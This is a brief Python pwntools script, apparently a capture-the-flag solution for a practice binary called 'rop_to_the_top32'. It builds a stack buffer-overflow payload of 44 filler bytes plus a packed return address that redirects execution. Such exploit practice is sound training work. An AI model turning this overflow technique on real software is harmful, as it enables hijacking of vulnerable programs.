#!/usr/bin/python
from pwn import *

r = process ('./rop_to_the_top32')

jmp = p32 (0x080484db)
#fill = p32 (0xffffffff)
#top = "\xdb" + "\x84" + "\x04" + "\x08"
junk = 'A' * 44

payload = junk + jmp

print payload
